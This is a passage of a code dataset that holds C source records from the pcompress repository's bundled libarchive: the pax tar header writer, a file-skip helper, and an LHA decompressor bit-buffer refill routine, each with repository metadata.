*/\n\tarchive_string_empty(&(pax->sparse_map));\n\tsparse_total = 0;\n\tsparse_list_clear(pax);\n\n\tif (hardlink == NULL &&\n\t    archive_entry_filetype(entry_main) == AE_IFREG)\n\t\tsparse_count = archive_entry_sparse_reset(entry_main);\n\telse\n\t\tsparse_count = 0;\n\tif (sparse_count) {\n\t\tint64_t offset, length, last_offset = 0;\n\t\t/* Get the last entry of sparse block. */\n\t\twhile (archive_entry_sparse_next(\n\t\t    entry_main, &offset, &length) == ARCHIVE_OK)\n\t\t\tlast_offset = offset + length;\n\n\t\t/* If the last sparse block does not reach the end of file,\n\t\t * We have to add a empty sparse block as the last entry to\n\t\t * manage storing file data. */\n\t\tif (last_offset < archive_entry_size(entry_main))\n\t\t\tarchive_entry_sparse_add_entry(entry_main,\n\t\t\t    archive_entry_size(entry_main), 0);\n\t\tsparse_count = archive_entry_sparse_reset(entry_main);\n\t}\n\n\t/*\n\t * First, check the name fields and see if any of them\n\t * require binary coding.  If any of them does, then all of\n\t * them do.\n\t */\n\tr = get_entry_pathname(a, entry_main, &path, &path_length, sconv);\n\tif (r == ARCHIVE_FATAL)\n\t\treturn (r);\n\telse if (r != ARCHIVE_OK) {\n\t\tr = get_entry_pathname(a, entry_main, &path,\n\t\t    &path_length, NULL);\n\t\tif (r == ARCHIVE_FATAL)\n\t\t\treturn (r);\n\t\tarchive_set_error(&a->archive, ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t    \"Can't translate pathname '%s' to %s\", path,\n\t\t    archive_string_conversion_charset_name(sconv));\n\t\tret = ARCHIVE_WARN;\n\t\tsconv = NULL;/* The header charset switches to binary mode. */\n\t}\n\tr = get_entry_uname(a, entry_main, &uname, &uname_length, sconv);\n\tif (r == ARCHIVE_FATAL)\n\t\treturn (r);\n\telse if (r != ARCHIVE_OK) {\n\t\tr = get_entry_uname(a, entry_main, &uname, &uname_length, NULL);\n\t\tif (r == ARCHIVE_FATAL)\n\t\t\treturn (r);\n\t\tarchive_set_error(&a->archive, ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t    \"Can't translate uname '%s' to %s\", uname,\n\t\t    archive_string_conversion_charset_name(sconv));\n\t\tret = ARCHIVE_WARN;\n\t\tsconv = NULL;/* The header charset switches to binary mode. */\n\t}\n\tr = get_entry_gname(a, entry_main, &gname, &gname_length, sconv);\n\tif (r == ARCHIVE_FATAL)\n\t\treturn (r);\n\telse if (r != ARCHIVE_OK) {\n\t\tr = get_entry_gname(a, entry_main, &gname, &gname_length, NULL);\n\t\tif (r == ARCHIVE_FATAL)\n\t\t\treturn (r);\n\t\tarchive_set_error(&a->archive, ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t    \"Can't translate gname '%s' to %s\", gname,\n\t\t    archive_string_conversion_charset_name(sconv));\n\t\tret = ARCHIVE_WARN;\n\t\tsconv = NULL;/* The header charset switches to binary mode. */\n\t}\n\tlinkpath = hardlink;\n\tlinkpath_length = hardlink_length;\n\tif (linkpath == NULL) {\n\t\tr = get_entry_symlink(a, entry_main, &linkpath,\n\t\t    &linkpath_length, sconv);\n\t\tif (r == ARCHIVE_FATAL)\n\t\t\treturn (r);\n\t\telse if (r != ARCHIVE_OK) {\n\t\t\tr = get_entry_symlink(a, entry_main, &linkpath,\n\t\t\t    &linkpath_length, NULL);\n\t\t\tif (r == ARCHIVE_FATAL)\n\t\t\t\treturn (r);\n\t\t\tarchive_set_error(&a->archive,\n\t\t\t    ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t\t    \"Can't translate linkname '%s' to %s\", linkpath,\n\t\t\t    archive_string_conversion_charset_name(sconv));\n\t\t\tret = ARCHIVE_WARN;\n\t\t\tsconv = NULL;\n\t\t}\n\t}\n\n\t/* If any string conversions failed, get all attributes\n\t * in binary-mode. */\n\tif (sconv == NULL && !pax->opt_binary) {\n\t\tif (hardlink != NULL) {\n\t\t\tr = get_entry_hardlink(a, entry_main, &hardlink,\n\t\t\t    &hardlink_length, NULL);\n\t\t\tif (r == ARCHIVE_FATAL)\n\t\t\t\treturn (r);\n\t\t\tlinkpath = hardlink;\n\t\t\tlinkpath_length = hardlink_length;\n\t\t}\n\t\tr = get_entry_pathname(a, entry_main, &path,\n\t\t    &path_length, NULL);\n\t\tif (r == ARCHIVE_FATAL)\n\t\t\treturn (r);\n\t\tr = get_entry_uname(a, entry_main, &uname, &uname_length, NULL);\n\t\tif (r == ARCHIVE_FATAL)\n\t\t\treturn (r);\n\t\tr = get_entry_gname(a, entry_main, &gname, &gname_length, NULL);\n\t\tif (r == ARCHIVE_FATAL)\n\t\t\treturn (r);\n\t}\n\n\t/* Store the header encoding first, to be nice to readers. */\n\tif (sconv == NULL)\n\t\tadd_pax_attr(&(pax->pax_header), \"hdrcharset\", \"BINARY\");\n\n\n\t/*\n\t * If name is too long, or has non-ASCII characters, add\n\t * 'path' to pax extended attrs.  (Note that an unconvertible\n\t * name must have non-ASCII characters.)\n\t */\n\tif (has_non_ASCII(path)) {\n\t\t/* We have non-ASCII characters. */\n\t\tadd_pax_attr(&(pax->pax_header), \"path\", path);\n\t\tarchive_entry_set_pathname(entry_main,\n\t\t    build_ustar_entry_name(ustar_entry_name,\n\t\t\tpath, path_length, NULL));\n\t\tneed_extension = 1;\n\t} else {\n\t\t/* We have an all-ASCII path; we'd like to just store\n\t\t * it in the ustar header if it will fit.  Yes, this\n\t\t * duplicates some of the logic in\n\t\t * archive_write_set_format_ustar.c\n\t\t */\n\t\tif (path_length <= 100) {\n\t\t\t/* Fits in the old 100-char tar name field. */\n\t\t} else {\n\t\t\t/* Find largest suffix that will fit. */\n\t\t\t/* Note: strlen() > 100, so strlen() - 100 - 1 >= 0 */\n\t\t\tsuffix = strchr(path + path_length - 100 - 1, '/');\n\t\t\t/* Don't attempt an empty prefix. */\n\t\t\tif (suffix == path)\n\t\t\t\tsuffix = strchr(suffix + 1, '/');\n\t\t\t/* We can put it in the ustar header if it's\n\t\t\t * all ASCII and it's either <= 100 characters\n\t\t\t * or can be split at a '/' into a prefix <=\n\t\t\t * 155 chars and a suffix <= 100 chars.  (Note\n\t\t\t * the strchr() above will return NULL exactly\n\t\t\t * when the path can't be split.)\n\t\t\t */\n\t\t\tif (suffix == NULL       /* Suffix > 100 chars. */\n\t\t\t    || suffix[1] == '\\0'    /* empty suffix */\n\t\t\t    || suffix - path > 155)  /* Prefix > 155 chars */\n\t\t\t{\n\t\t\t\tadd_pax_attr(&(pax->pax_header), \"path\", path);\n\t\t\t\tarchive_entry_set_pathname(entry_main,\n\t\t\t\t    build_ustar_entry_name(ustar_entry_name,\n\t\t\t\t\tpath, path_length, NULL));\n\t\t\t\tneed_extension = 1;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (linkpath != NULL) {\n\t\t/* If link name is too long or has non-ASCII characters, add\n\t\t * 'linkpath' to pax extended attrs. */\n\t\tif (linkpath_length > 100 || has_non_ASCII(linkpath)) {\n\t\t\tadd_pax_attr(&(pax->pax_header), \"linkpath\", linkpath);\n\t\t\tif (linkpath_length > 100) {\n\t\t\t\tif (hardlink != NULL)\n\t\t\t\t\tarchive_entry_set_hardlink(entry_main,\n\t\t\t\t\t    \"././@LongHardLink\");\n\t\t\t\telse\n\t\t\t\t\tarchive_entry_set_symlink(entry_main,\n\t\t\t\t\t    \"././@LongSymLink\");\n\t\t\t}\n\t\t\tneed_extension = 1;\n\t\t}\n\t}\n\t/* Save a pathname since it will be renamed if `entry_main` has\n\t * sparse blocks. */\n\tarchive_string_init(&entry_name);\n\tarchive_strcpy(&entry_name, archive_entry_pathname(entry_main));\n\n\t/* If file size is too large, add 'size' to pax extended attrs. */\n\tif (archive_entry_size(entry_main) >= (((int64_t)1) << 33)) {\n\t\tadd_pax_attr_int(&(pax->pax_header), \"size\",\n\t\t    archive_entry_size(entry_main));\n\t\tneed_extension = 1;\n\t}\n\n\t/* If numeric GID is too large, add 'gid' to pax extended attrs. */\n\tif ((unsigned int)archive_entry_gid(entry_main) >= (1 << 18)) {\n\t\tadd_pax_attr_int(&(pax->pax_header), \"gid\",\n\t\t    archive_entry_gid(entry_main));\n\t\tneed_extension = 1;\n\t}\n\n\t/* If group name is too large or has non-ASCII characters, add\n\t * 'gname' to pax extended attrs. */\n\tif (gname != NULL) {\n\t\tif (gname_length > 31 || has_non_ASCII(gname)) {\n\t\t\tadd_pax_attr(&(pax->pax_header), \"gname\", gname);\n\t\t\tneed_extension = 1;\n\t\t}\n\t}\n\n\t/* If numeric UID is too large, add 'uid' to pax extended attrs. */\n\tif ((unsigned int)archive_entry_uid(entry_main) >= (1 << 18)) {\n\t\tadd_pax_attr_int(&(pax->pax_header), \"uid\",\n\t\t    archive_entry_uid(entry_main));\n\t\tneed_extension = 1;\n\t}\n\n\t/* Add 'uname' to pax extended attrs if necessary. */\n\tif (uname != NULL) {\n\t\tif (uname_length > 31 || has_non_ASCII(uname)) {\n\t\t\tadd_pax_attr(&(pax->pax_header), \"uname\", uname);\n\t\t\tneed_extension = 1;\n\t\t}\n\t}\n\n\t/*\n\t * POSIX/SUSv3 doesn't provide a standard key for large device\n\t * numbers.  I use the same keys here that Joerg Schilling\n\t * used for 'star.'  (Which, somewhat confusingly, are called\n\t * \"devXXX\" even though they code \"rdev\" values.)  No doubt,\n\t * other implementations use other keys.  Note that there's no\n\t * reason we can't write the same information into a number of\n\t * different keys.\n\t *\n\t * Of course, this is only needed for block or char device entries.\n\t */\n\tif (archive_entry_filetype(entry_main) == AE_IFBLK\n\t    || archive_entry_filetype(entry_main) == AE_IFCHR) {\n\t\t/*\n\t\t * If rdevmajor is too large, add 'SCHILY.devmajor' to\n\t\t * extended attributes.\n\t\t */\n\t\tint rdevmajor, rdevminor;\n\t\trdevmajor = archive_entry_rdevmajor(entry_main);\n\t\trdevminor = archive_entry_rdevminor(entry_main);\n\t\tif (rdevmajor >= (1 << 18)) {\n\t\t\tadd_pax_attr_int(&(pax->pax_header), \"SCHILY.devmajor\",\n\t\t\t    rdevmajor);\n\t\t\t/*\n\t\t\t * Non-strict formatting below means we don't\n\t\t\t * have to truncate here.  Not truncating improves\n\t\t\t * the chance that some more modern tar archivers\n\t\t\t * (such as GNU tar 1.13) can restore the full\n\t\t\t * value even if they don't understand the pax\n\t\t\t * extended attributes.  See my rant below about\n\t\t\t * file size fields for additional details.\n\t\t\t */\n\t\t\t/* archive_entry_set_rdevmajor(entry_main,\n\t\t\t   rdevmajor & ((1 << 18) - 1)); */\n\t\t\tneed_extension = 1;\n\t\t}\n\n\t\t/*\n\t\t * If devminor is too large, add 'SCHILY.devminor' to\n\t\t * extended attributes.\n\t\t */\n\t\tif (rdevminor >= (1 << 18)) {\n\t\t\tadd_pax_attr_int(&(pax->pax_header), \"SCHILY.devminor\",\n\t\t\t    rdevminor);\n\t\t\t/* Truncation is not necessary here, either. */\n\t\t\t/* archive_entry_set_rdevminor(entry_main,\n\t\t\t   rdevminor & ((1 << 18) - 1)); */\n\t\t\tneed_extension = 1;\n\t\t}\n\t}\n\n\t/*\n\t * Technically, the mtime field in the ustar header can\n\t * support 33 bits, but many platforms use signed 32-bit time\n\t * values.  The cutoff of 0x7fffffff here is a compromise.\n\t * Yes, this check is duplicated just below; this helps to\n\t * avoid writing an mtime attribute just to handle a\n\t * high-resolution timestamp in \"restricted pax\" mode.\n\t */\n\tif (!need_extension &&\n\t    ((archive_entry_mtime(entry_main) < 0)\n\t\t|| (archive_entry_mtime(entry_main) >= 0x7fffffff)))\n\t\tneed_extension = 1;\n\n\t/* I use a star-compatible file flag attribute. */\n\tp = archive_entry_fflags_text(entry_main);\n\tif (!need_extension && p != NULL  &&  *p != '\\0')\n\t\tneed_extension = 1;\n\n\t/* If there are non-trivial ACL entries, we need an extension. */\n\tif (!need_extension && archive_entry_acl_count(entry_original,\n\t\tARCHIVE_ENTRY_ACL_TYPE_ACCESS) > 0)\n\t\tneed_extension = 1;\n\n\t/* If there are non-trivial ACL entries, we need an extension. */\n\tif (!need_extension && archive_entry_acl_count(entry_original,\n\t\tARCHIVE_ENTRY_ACL_TYPE_DEFAULT) > 0)\n\t\tneed_extension = 1;\n\n\t/* If there are extended attributes, we need an extension */\n\tif (!need_extension && archive_entry_xattr_count(entry_original) > 0)\n\t\tneed_extension = 1;\n\n\t/* If there are sparse info, we need an extension */\n\tif (!need_extension && sparse_count > 0)\n\t\tneed_extension = 1;\n\n\t/*\n\t * The following items are handled differently in \"pax\n\t * restricted\" format.  In particular, in \"pax restricted\"\n\t * format they won't be added unless need_extension is\n\t * already set (we're already generating an extended header, so\n\t * may as well include these).\n\t */\n\tif (a->archive.archive_format != ARCHIVE_FORMAT_TAR_PAX_RESTRICTED ||\n\t    need_extension) {\n\n\t\tif (archive_entry_mtime(entry_main) < 0  ||\n\t\t    archive_entry_mtime(entry_main) >= 0x7fffffff  ||\n\t\t    archive_entry_mtime_nsec(entry_main) != 0)\n\t\t\tadd_pax_attr_time(&(pax->pax_header), \"mtime\",\n\t\t\t    archive_entry_mtime(entry_main),\n\t\t\t    archive_entry_mtime_nsec(entry_main));\n\n\t\tif (archive_entry_ctime(entry_main) != 0  ||\n\t\t    archive_entry_ctime_nsec(entry_main) != 0)\n\t\t\tadd_pax_attr_time(&(pax->pax_header), \"ctime\",\n\t\t\t    archive_entry_ctime(entry_main),\n\t\t\t    archive_entry_ctime_nsec(entry_main));\n\n\t\tif (archive_entry_atime(entry_main) != 0 ||\n\t\t    archive_entry_atime_nsec(entry_main) != 0)\n\t\t\tadd_pax_attr_time(&(pax->pax_header), \"atime\",\n\t\t\t    archive_entry_atime(entry_main),\n\t\t\t    archive_entry_atime_nsec(entry_main));\n\n\t\t/* Store birth/creationtime only if it's earlier than mtime */\n\t\tif (archive_entry_birthtime_is_set(entry_main) &&\n\t\t    archive_entry_birthtime(entry_main)\n\t\t    < archive_entry_mtime(entry_main))\n\t\t\tadd_pax_attr_time(&(pax->pax_header),\n\t\t\t    \"LIBARCHIVE.creationtime\",\n\t\t\t    archive_entry_birthtime(entry_main),\n\t\t\t    archive_entry_birthtime_nsec(entry_main));\n\n\t\t/* I use a star-compatible file flag attribute. */\n\t\tp = archive_entry_fflags_text(entry_main);\n\t\tif (p != NULL  &&  *p != '\\0')\n\t\t\tadd_pax_attr(&(pax->pax_header), \"SCHILY.fflags\", p);\n\n\t\t/* I use star-compatible ACL attributes. */\n\t\tr = archive_entry_acl_text_l(entry_original,\n\t\t    ARCHIVE_ENTRY_ACL_TYPE_ACCESS |\n\t\t    ARCHIVE_ENTRY_ACL_STYLE_EXTRA_ID,\n\t\t    &p, NULL, pax->sconv_utf8);\n\t\tif (r != 0) {\n\t\t\tif (errno == ENOMEM) {\n\t\t\t\tarchive_set_error(&a->archive, ENOMEM,\n\t\t\t\t    \"Can't allocate memory for \"\n\t\t\t\t    \"ACL.access\");\n\t\t\t\treturn (ARCHIVE_FATAL);\n\t\t\t}\n\t\t\tarchive_set_error(&a->archive,\n\t\t\t    ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t\t    \"Can't translate ACL.access to UTF-8\");\n\t\t\tret = ARCHIVE_WARN;\n\t\t} else if (p != NULL && *p != '\\0') {\n\t\t\tadd_pax_attr(&(pax->pax_header),\n\t\t\t    \"SCHILY.acl.access\", p);\n\t\t}\n\t\tr = archive_entry_acl_text_l(entry_original,\n\t\t    ARCHIVE_ENTRY_ACL_TYPE_DEFAULT |\n\t\t    ARCHIVE_ENTRY_ACL_STYLE_EXTRA_ID,\n\t\t    &p, NULL, pax->sconv_utf8);\n\t\tif (r != 0) {\n\t\t\tif (errno == ENOMEM) {\n\t\t\t\tarchive_set_error(&a->archive, ENOMEM,\n\t\t\t\t    \"Can't allocate memory for \"\n\t\t\t\t    \"ACL.default\");\n\t\t\t\treturn (ARCHIVE_FATAL);\n\t\t\t}\n\t\t\tarchive_set_error(&a->archive,\n\t\t\t    ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t\t    \"Can't translate ACL.default to UTF-8\");\n\t\t\tret = ARCHIVE_WARN;\n\t\t} else if (p != NULL && *p != '\\0') {\n\t\t\tadd_pax_attr(&(pax->pax_header),\n\t\t\t    \"SCHILY.acl.default\", p);\n\t\t}\n\n\t\t/* We use GNU-tar-compatible sparse attributes. */\n\t\tif (sparse_count > 0) {\n\t\t\tint64_t soffset, slength;\n\n\t\t\tadd_pax_attr_int(&(pax->pax_header),\n\t\t\t    \"GNU.sparse.major\", 1);\n\t\t\tadd_pax_attr_int(&(pax->pax_header),\n\t\t\t    \"GNU.sparse.minor\", 0);\n\t\t\tadd_pax_attr(&(pax->pax_header),\n\t\t\t    \"GNU.sparse.name\", entry_name.s);\n\t\t\tadd_pax_attr_int(&(pax->pax_header),\n\t\t\t    \"GNU.sparse.realsize\",\n\t\t\t    archive_entry_size(entry_main));\n\n\t\t\t/* Rename the file name which will be used for\n\t\t\t * ustar header to a special name, which GNU\n\t\t\t * PAX Format 1.0 requires */\n\t\t\tarchive_entry_set_pathname(entry_main,\n\t\t\t    build_gnu_sparse_name(gnu_sparse_name,\n\t\t\t        entry_name.s));\n\n\t\t\t/*\n\t\t\t * - Make a sparse map, which will precede a file data.\n\t\t\t * - Get the total size of available data of sparse.\n\t\t\t */\n\t\t\tarchive_string_sprintf(&(pax->sparse_map), \"%d\\n\",\n\t\t\t    sparse_count);\n\t\t\twhile (archive_entry_sparse_next(entry_main,\n\t\t\t    &soffset, &slength) == ARCHIVE_OK) {\n\t\t\t\tarchive_string_sprintf(&(pax->sparse_map),\n\t\t\t\t    \"%jd\\n%jd\\n\",\n\t\t\t\t    (intmax_t)soffset,\n\t\t\t\t    (intmax_t)slength);\n\t\t\t\tsparse_total += slength;\n\t\t\t\tif (sparse_list_add(pax, soffset, slength)\n\t\t\t\t    != ARCHIVE_OK) {\n\t\t\t\t\tarchive_set_error(&a->archive,\n\t\t\t\t\t    ENOMEM,\n\t\t\t\t\t    \"Can't allocate memory\");\n\t\t\t\t\tarchive_entry_free(entry_main);\n\t\t\t\t\tarchive_string_free(&entry_name);\n\t\t\t\t\treturn (ARCHIVE_FATAL);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t/* Store extended attributes */\n\t\tif (archive_write_pax_header_xattrs(a, pax, entry_original)\n\t\t    == ARCHIVE_FATAL) {\n\t\t\tarchive_entry_free(entry_main);\n\t\t\tarchive_string_free(&entry_name);\n\t\t\treturn (ARCHIVE_FATAL);\n\t\t}\n\t}\n\n\t/* Only regular files have data. */\n\tif (archive_entry_filetype(entry_main) != AE_IFREG)\n\t\tarchive_entry_set_size(entry_main, 0);\n\n\t/*\n\t * Pax-restricted does not store data for hardlinks, in order\n\t * to improve compatibility with ustar.\n\t */\n\tif (a->archive.archive_format != ARCHIVE_FORMAT_TAR_PAX_INTERCHANGE &&\n\t    hardlink != NULL)\n\t\tarchive_entry_set_size(entry_main, 0);\n\n\t/*\n\t * XXX Full pax interchange format does permit a hardlink\n\t * entry to have data associated with it.  I'm not supporting\n\t * that here because the client expects me to tell them whether\n\t * or not this format expects data for hardlinks.  If I\n\t * don't check here, then every pax archive will end up with\n\t * duplicated data for hardlinks.  Someday, there may be\n\t * need to select this behavior, in which case the following\n\t * will need to be revisited. XXX\n\t */\n\tif (hardlink != NULL)\n\t\tarchive_entry_set_size(entry_main, 0);\n\n\t/* Save a real file size. */\n\treal_size = archive_entry_size(entry_main);\n\t/*\n\t * Overwrite a file size by the total size of sparse blocks and\n\t * the size of sparse map info. That file size is the length of\n\t * the data, which we will exactly store into an archive file.\n\t */\n\tif (archive_strlen(&(pax->sparse_map))) {\n\t\tsize_t mapsize = archive_strlen(&(pax->sparse_map));\n\t\tpax->sparse_map_padding = 0x1ff & (-(ssize_t)mapsize);\n\t\tarchive_entry_set_size(entry_main,\n\t\t    mapsize + pax->sparse_map_padding + sparse_total);\n\t}\n\n\t/* Format 'ustar' header for main entry.\n\t *\n\t * The trouble with file size: If the reader can't understand\n\t * the file size, they may not be able to locate the next\n\t * entry and the rest of the archive is toast.  Pax-compliant\n\t * readers are supposed to ignore the file size in the main\n\t * header, so the question becomes how to maximize portability\n\t * for readers that don't support pax attribute extensions.\n\t * For maximum compatibility, I permit numeric extensions in\n\t * the main header so that the file size stored will always be\n\t * correct, even if it's in a format that only some\n\t * implementations understand.  The technique used here is:\n\t *\n\t *  a) If possible, follow the standard exactly.  This handles\n\t *  files up to 8 gigabytes minus 1.\n\t *\n\t *  b) If that fails, try octal but omit the field terminator.\n\t *  That handles files up to 64 gigabytes minus 1.\n\t *\n\t *  c) Otherwise, use base-256 extensions.  That handles files\n\t *  up to 2^63 in this implementation, with the potential to\n\t *  go up to 2^94.  That should hold us for a while. ;-)\n\t *\n\t * The non-strict formatter uses similar logic for other\n\t * numeric fields, though they're less critical.\n\t */\n\tif (__archive_write_format_header_ustar(a, ustarbuff, entry_main, -1, 0,\n\t    NULL) == ARCHIVE_FATAL)\n\t\treturn (ARCHIVE_FATAL);\n\n\t/* If we built any extended attributes, write that entry first. */\n\tif (archive_strlen(&(pax->pax_header)) > 0) {\n\t\tstruct archive_entry *pax_attr_entry;\n\t\ttime_t s;\n\t\tint64_t uid, gid;\n\t\tint mode;\n\n\t\tpax_attr_entry = archive_entry_new2(&a->archive);\n\t\tp = entry_name.s;\n\t\tarchive_entry_set_pathname(pax_attr_entry,\n\t\t    build_pax_attribute_name(pax_entry_name, p));\n\t\tarchive_entry_set_size(pax_attr_entry,\n\t\t    archive_strlen(&(pax->pax_header)));\n\t\t/* Copy uid/gid (but clip to ustar limits). */\n\t\tuid = archive_entry_uid(entry_main);\n\t\tif (uid >= 1 << 18)\n\t\t\tuid = (1 << 18) - 1;\n\t\tarchive_entry_set_uid(pax_attr_entry, uid);\n\t\tgid = archive_entry_gid(entry_main);\n\t\tif (gid >= 1 << 18)\n\t\t\tgid = (1 << 18) - 1;\n\t\tarchive_entry_set_gid(pax_attr_entry, gid);\n\t\t/* Copy mode over (but not setuid/setgid bits) */\n\t\tmode = archive_entry_mode(entry_main);\n#ifdef S_ISUID\n\t\tmode &= ~S_ISUID;\n#endif\n#ifdef S_ISGID\n\t\tmode &= ~S_ISGID;\n#endif\n#ifdef S_ISVTX\n\t\tmode &= ~S_ISVTX;\n#endif\n\t\tarchive_entry_set_mode(pax_attr_entry, mode);\n\n\t\t/* Copy uname/gname. */\n\t\tarchive_entry_set_uname(pax_attr_entry,\n\t\t    archive_entry_uname(entry_main));\n\t\tarchive_entry_set_gname(pax_attr_entry,\n\t\t    archive_entry_gname(entry_main));\n\n\t\t/* Copy mtime, but clip to ustar limits. */\n\t\ts = archive_entry_mtime(entry_main);\n\t\tif (s < 0) { s = 0; }\n\t\tif (s >= 0x7fffffff) { s = 0x7fffffff; }\n\t\tarchive_entry_set_mtime(pax_attr_entry, s, 0);\n\n\t\t/* Standard ustar doesn't support atime. */\n\t\tarchive_entry_set_atime(pax_attr_entry, 0, 0);\n\n\t\t/* Standard ustar doesn't support ctime. */\n\t\tarchive_entry_set_ctime(pax_attr_entry, 0, 0);\n\n\t\tr = __archive_write_format_header_ustar(a, paxbuff,\n\t\t    pax_attr_entry, 'x', 1, NULL);\n\n\t\tarchive_entry_free(pax_attr_entry);\n\n\t\t/* Note that the 'x' header shouldn't ever fail to format */\n\t\tif (r < ARCHIVE_WARN) {\n\t\t\tarchive_set_error(&a->archive, ARCHIVE_ERRNO_MISC,\n\t\t\t    \"archive_write_pax_header: \"\n\t\t\t    \"'x' header failed?!  This can't happen.\\n\");\n\t\t\treturn (ARCHIVE_FATAL);\n\t\t} else if (r < ret)\n\t\t\tret = r;\n\t\tr = __archive_write_output(a, paxbuff, 512);\n\t\tif (r != ARCHIVE_OK) {\n\t\t\tsparse_list_clear(pax);\n\t\t\tpax->entry_bytes_remaining = 0;\n\t\t\tpax->entry_padding = 0;\n\t\t\treturn (ARCHIVE_FATAL);\n\t\t}\n\n\t\tpax->entry_bytes_remaining = archive_strlen(&(pax->pax_header));\n\t\tpax->entry_padding =\n\t\t    0x1ff & (-(int64_t)pax->entry_bytes_remaining);\n\n\t\tr = __archive_write_output(a, pax->pax_header.s,\n\t\t    archive_strlen(&(pax->pax_header)));\n\t\tif (r != ARCHIVE_OK) {\n\t\t\t/* If a write fails, we're pretty much toast. */\n\t\t\treturn (ARCHIVE_FATAL);\n\t\t}\n\t\t/* Pad out the end of the entry. */\n\t\tr = __archive_write_nulls(a, (size_t)pax->entry_padding);\n\t\tif (r != ARCHIVE_OK) {\n\t\t\t/* If a write fails, we're pretty much toast. */\n\t\t\treturn (ARCHIVE_FATAL);\n\t\t}\n\t\tpax->entry_bytes_remaining = pax->entry_padding = 0;\n\t}\n\n\t/* Write the header for main entry. */\n\tr = __archive_write_output(a, ustarbuff, 512);\n\tif (r != ARCHIVE_OK)\n\t\treturn (r);\n\n\t/*\n\t * Inform the client of the on-disk size we're using, so\n\t * they can avoid unnecessarily writing a body for something\n\t * that we're just going to ignore.\n\t */\n\tarchive_entry_set_size(entry_original, real_size);\n\tif (pax->sparse_list == NULL && real_size > 0) {\n\t\t/* This is not a sparse file but we handle its data as\n\t\t * a sparse block. */\n\t\tsparse_list_add(pax, 0, real_size);\n\t\tsparse_total = real_size;\n\t}\n\tpax->entry_padding = 0x1ff & (-(int64_t)sparse_total);\n\tarchive_entry_free(entry_main);\n\tarchive_string_free(&entry_name);\n\n\treturn (ret);\n}", "path": "archive\\libarchive\\libarchive\\archive_write_set_format_pax.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * TODO: Implement another file_skip_XXXX that uses MTIO ioctls to\n * accelerate operation on tape drives.\n */\n", "func_signal": "static int64_t\nfile_skip(struct archive *a, void *client_data, int64_t request)", "code": "{\n\tstruct read_file_data *mine = (struct read_file_data *)client_data;\n\n\t/* Delegate skip requests. */\n\tif (mine->use_lseek)\n\t\treturn (file_skip_lseek(a, client_data, request));\n\n\t/* If we can't skip, return 0; libarchive will read+discard instead. */\n\treturn (0);\n}", "path": "archive\\libarchive\\libarchive\\archive_read_open_filename.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Shift away used bits in the cache data and fill it up with following bits.\n * Call this when cache buffer does not have enough bits you need.\n *\n * Returns 1 if the cache buffer is full.\n * Returns 0 if the cache buffer is not full; input buffer is empty.\n */\n", "func_signal": "static int\nlzh_br_fillup(struct lzh_stream *strm, struct lzh_br *br)", "code": "{\n\tint n = CACHE_BITS - br->cache_avail;\n\n\tfor (;;) {\n\t\tswitch (n >> 3) {\n\t\tcase 8:\n\t\t\tif (strm->avail_in >= 8) {\n\t\t\t\tbr->cache_buffer =\n\t\t\t\t    ((uint64_t)strm->next_in[0]) << 56 |\n\t\t\t\t    ((uint64_t)strm->next_in[1]) << 48 |\n\t\t\t\t    ((uint64_t)strm->next_in[2]) << 40 |\n\t\t\t\t    ((uint64_t)strm->next_in[3]) << 32 |\n\t\t\t\t    ((uint32_t)strm->next_in[4]) << 24 |\n\t\t\t\t    ((uint32_t)strm->next_in[5]) << 16 |\n\t\t\t\t    ((uint32_t)strm->next_in[6]) << 8 |\n\t\t\t\t     (uint32_t)strm->next_in[7];\n\t\t\t\tstrm->next_in += 8;\n\t\t\t\tstrm->avail_in -= 8;\n\t\t\t\tbr->cache_avail += 8 * 8;\n\t\t\t\treturn (1);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 7:\n\t\t\tif (strm->avail_in >= 7) {\n\t\t\t\tbr->cache_buffer =\n\t\t \t\t   (br->cache_buffer << 56) |\n\t\t\t\t    ((uint64_t)strm->next_in[0]) << 48 |\n\t\t\t\t    ((uint64_t)strm->next_in[1]) << 40 |\n\t\t\t\t    ((uint64_t)strm->next_in[2]) << 32 |\n\t\t\t\t    ((uint32_t)strm->next_in[3]) << 24 |\n\t\t\t\t    ((uint32_t)strm->next_in[4]) << 16 |\n\t\t\t\t    ((uint32_t)strm->next_in[5]) << 8 |\n\t\t\t\t     (uint32_t)strm->next_in[6];\n\t\t\t\tstrm->next_in += 7;\n\t\t\t\tstrm->avail_in -= 7;\n\t\t\t\tbr->cache_avail += 7 * 8;\n\t\t\t\treturn (1);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 6:\n\t\t\tif (strm->avail_in >= 6) {\n\t\t\t\tbr->cache_buffer =\n\t\t \t\t   (br->cache_buffer << 48) |\n\t\t\t\t    ((uint64_t)strm->next_in[0]) << 40 |\n\t\t\t\t    ((uint64_t)strm->next_in[1]) << 32 |\n\t\t\t\t    ((uint32_t)strm->next_in[2]) << 24 |\n\t\t\t\t    ((uint32_t)strm->next_in[3]) << 16 |\n\t\t\t\t    ((uint32_t)strm->next_in[4]) << 8 |\n\t\t\t\t     (uint32_t)strm->next_in[5];\n\t\t\t\tstrm->next_in += 6;\n\t\t\t\tstrm->avail_in -= 6;\n\t\t\t\tbr->cache_avail += 6 * 8;\n\t\t\t\treturn (1);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 0:\n\t\t\t/* We have enough compressed data in\n\t\t\t * the cache buffer.*/ \n\t\t\treturn (1);\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t\tif (strm->avail_in == 0) {\n\t\t\t/* There is not enough compressed data to fill up the\n\t\t\t * cache buffer. */\n\t\t\treturn (0);\n\t\t}\n\t\tbr->cache_buffer =\n\t\t   (br->cache_buffer << 8) | *strm->next_in++;\n\t\tstrm->avail_in--;\n\t\tbr->cache_avail += 8;\n\t\tn -= 8;\n\t}\n}", "path": "archive\\libarchive\\libarchive\\archive_read_support_format_lha.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", 